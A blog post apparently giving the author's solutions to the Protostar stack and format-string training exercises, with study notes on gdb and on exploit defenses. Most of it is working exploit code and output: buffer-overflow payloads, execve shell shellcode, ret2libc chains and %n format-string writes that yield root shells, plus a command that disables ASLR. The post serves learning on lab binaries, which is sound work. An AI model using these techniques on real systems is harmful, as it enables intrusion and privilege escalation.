---
layout: post
title: "Protostar Exercices solutions"
date: 2020-04-01
categories: jekyll update
---

# Introduction
I've done a long time ago the stack exercices of [Protostar](https://exploit-exercises.lains.space/protostar/), they have been sitting for a while on my home folder, thought they might be usefull for someone, here are the solution for stack0-7, manually done before I discovered the joy of pwntools, uncommentend due to time constrains.

```bash
####STACK1
user@protostar:/opt/protostar/bin$ ./stack1 $(python -c "print 'A'*64+'\x64\x63\x62\x61'")
you have correctly got the variable to the right value

```
```bash
####STACK2	
user@protostar:/opt/protostar/bin$ GREENIE=$(python -c "print 'A'*64+'\x0a\x0d\x0a\x0d'") ./stack2 0x0d0a0d0a
you have correctly modified the variable
```

```bash
####STACK3
user@protostar:/opt/protostar/bin$ python -c "print 'A'*64+'\x24\x84\x04\x08'" | ./stack3 0x08048424
calling function pointer, jumping to 0x08048424
code flow successfully changed

```
```bash
####STACK4
user@protostar:/opt/protostar/bin$ python -c "print 'A'*76+'\xf4\x83\x04\x08'" | ./stack4                   
code flow successfully changed

```

```bash
####STACK5
user@protostar:~$ cat stack5.py
import struct
EIP = struct.pack("I", 0xbffff790+120)
shellcode= "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
payload="A"*(76)+EIP+"\x90"*(100)+shellcode#"\xcc"
print payload
user@protostar:~$ cd /opt/protostar/bin/ ; (python /home/user/stack5.py;cat) | ./stack5 ; cd -
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)


```
```bash
##############  STACK6
user@protostar:~$ cat stack6.py
import struct

buff = struct.pack("I", 0xbffff6ec)

shellcode= "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
# bzzzzt !! the program do not allow to execute on the stack, lets bypass this by returning first in the ret of the func, then returning to your shellcode.

#EIP = struct.pack("I", 0xbffff7b0+10)
#buff = struct.pack("I", 0xbffff6ec)

EIP1 = struct.pack("I", 0x080484f9) # Address of return in getpath
EIP2 = struct.pack("I", 0xbffffea4+40) # Address of nopsled
payload="A"*(80)+EIP1+EIP2+"\x90"*(400)+shellcode
print payload

user@protostar:~$ (python stack6.py ;cat ) | env - /opt/protostar/bin/stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒1▒Ph//shh/bin▒▒PS▒▒
                                                                               ̀
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
Lesson learned: gdb take space in stack, increase size of nops.




```
```bash
################ STACK6 ret2libc
user@protostar:~$ cat stack6_ret2libc.py
import struct


addr_system = struct.pack("I",    0xb7ecffb0)
addr_ret_after = struct.pack("I", 0xbffff6ec)
addr_shell_str= struct.pack ("I", 0xb7fb63bf)

payload="A"*(80)+addr_system+addr_ret_after+addr_shell_str
print payload
user@protostar:~$ (python stack6_ret2libc.py ; cat ) | env - /opt/protostar/bin/stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA▒▒▒AAAAAAAAAAAA▒▒▒▒▒▒▒▒c▒
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
exit

Segmentation fault
user@protostar:~$



```
```bash
#################  STACK7 
user@protostar:~$ cat stack7_ret2libc.py
import struct

addr_system = struct.pack("I",    0xb7ecffb0)
addr_ret_after = struct.pack("I", 0xb7fb63c7) #points to exit 0
addr_shell_str= struct.pack ("I", 0xb7fb63bf)
addr_ret_gadget = struct.pack("I",0x08048544)

payload="A"*(80)+addr_ret_gadget+addr_system+addr_ret_after+addr_shell_str
print payload
user@protostar:~$ (python stack7_ret2libc.py ; cat ) | env - /opt/protostar/bin/stack7
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAAAAAAAAAD▒▒▒▒c▒c▒
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```

```bash
##################### ######## FORMAT
user@protostar:~$ cat format0.py


import struct


payload= "A"*64+"\xef\xbe\xad\xde"
print payload
user@protostar:~$ env - /opt/protostar/bin/format0 $(python format0.py)
you have hit the target correctly :)
```
```bash
############################### FORMAT1
1user@protostar:~$ ./format1 "`python -c "print 'AAAAAAAAA'+'\x38\x96\x04\x08'+'BBBBBB'+'%x'*130+' %x' " `"
AAAAAAAAA8BBBBBB804960cbffff6d88048469b7fd8304b7fd7ff4bffff6d88048435bffff8a3b7ff1040804845bb7fd7ff480484500bffff758b7eadc762bffff784bffff790b7fe1848bffff740ffffffffb7ffeff4804824d1bffff740b7ff0626b7fffab0b7fe1b28b7fd7ff400bffff758d2412337f8149527000280483400b7ff6210b7eadb9bb7ffeff42804834008048361804841c2bffff78480484508048440b7ff1040bffff77cb7fff8f82bffff899bffff8a30bffff9bebffff9ccbffff9d7bffff9f7bffffa0abffffa14bfffff04bfffff42bfffff56bfffff65bfffff76bfffff7ebfffff8ebfffff9bbfffffccbfffffe6020b7fe241421b7fe200010178bfbbf61000116438048034420577b7fe30008098048340b3e9c0d3e9e3e917119bffff87b1fbffffff2fbffff88b000510000007106844f272416d673baa31369c378fd36383600662f2e00616d726f410031744141414141414141 8049638user@protostar:~$ ./format1 "`python -c "print 'AAAAAAAAA'+'\x38\x96\x04\x08'+'BBBBBB'+'%x'*130+' %n' " `"
AAAAAAAAA8BBBBBB804960cbffff6d88048469b7fd8304b7fd7ff4bffff6d88048435bffff8a3b7ff1040804845bb7fd7ff480484500bffff758b7eadc762bffff784bffff790b7fe1848bffff740ffffffffb7ffeff4804824d1bffff740b7ff0626b7fffab0b7fe1b28b7fd7ff400bffff75852af93fd78fa25ed000280483400b7ff6210b7eadb9bb7ffeff42804834008048361804841c2bffff78480484508048440b7ff1040bffff77cb7fff8f82bffff899bffff8a30bffff9bebffff9ccbffff9d7bffff9f7bffffa0abffffa14bfffff04bfffff42bfffff56bfffff65bfffff76bfffff7ebfffff8ebfffff9bbfffffccbfffffe6020b7fe241421b7fe200010178bfbbf61000116438048034420577b7fe30008098048340b3e9c0d3e9e3e917119bffff87b1fbffffff2fbffff88b000850000002970f43b224156a14c3de51669ac41c936383600662f2e00616d726f410031744141414141414141 you have modified the target :)
user@protostar:~$
################################################################
```

# Some of my notes during the attempts

## Endianness
- lscpu 
- echo -n I | od -to2 | head -n1 | cut -f2 -d" " | cut -c6  
Big Endian-System =1


## Gdb
- continue <= continue until next break 
- define X <= define a macro and finish with "end"
- start arg1 arg2 ..<= run until breakpoint and pass args to program
- run arg1 arg2 ..<= run and ignore breakpoint and pass args to program
- b *ADDRESS <= add break on that address
- del ADDRESS <= delete breakpoint
- break main <= bypass function prolog
- break *main <= break before function prolog
- break *ADDRESS <= DUNO WHY else its pending ....
- next => Go to next instruction (source line) but donʻt dive into functions.
- finish => Continue until the current function re-turns.
- continue => Continue normal execution 
- info fun 
- x/100x $sp => show stack memory
- info frame => callstack	
- info registers <= show all registers
- i r eip <= show eip
- x/[Length][Format] [Address expression] <= Displays the memory contents at a given address using the specified format.
- w - word (32-bit value)
- g - giant word (64-bit value)
- I instruction
- set disassembly-flavor intel <= Destination Source
- define hook-stop <= script gdb commands to execute on breakpoint, finish with "end"
- info symbol ADDRESS <= show what function that address corresponds


## General Info
- objdump -t  <= list symbols of a binary
- Stripped variable names removed
- Staticly linked : libraries compiled in the binary (big binary)
- When sending shellcode payload, add a cat like : 
```bash
(python -c "AAA..." ; cat) | ./bin
```
- to get function address: disasemble the function and get the first address
- Linux Ubuntu 18.04 payload needs to be multiple of 16byte
- [GDB adding offset in memory](https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it/17775966#17775966)
- [Predict GDB offset](https://reverseengineering.stackexchange.com/questions/2983/how-to-predict-address-space-layout-differences-between-real-and-gdb-controlled)
- [ret2libc](https://www.youtube.com/watch?v=m17mV24TgwY&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=16)


## Defense Mechanisms
- [Stack Canaries](https://ctf101.org/binary-exploitation/stack-canaries/)  are a secret value placed on the stack which changes every time the program is started.
Prior to a function return, the stack canary is checked and if it appears to be modified, the program exits immeadiately.
Return instruction pointers are usually protected by stack canaries.
- Data Execution Prevention  <== rwe in stack/memory etc to prevent jumping to shellcode, but defeated by ret2libc
- ASLR Address Space Layout Randomization, prenveting to get addresss of libc.
- Disable ASLR on the running system: 

```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
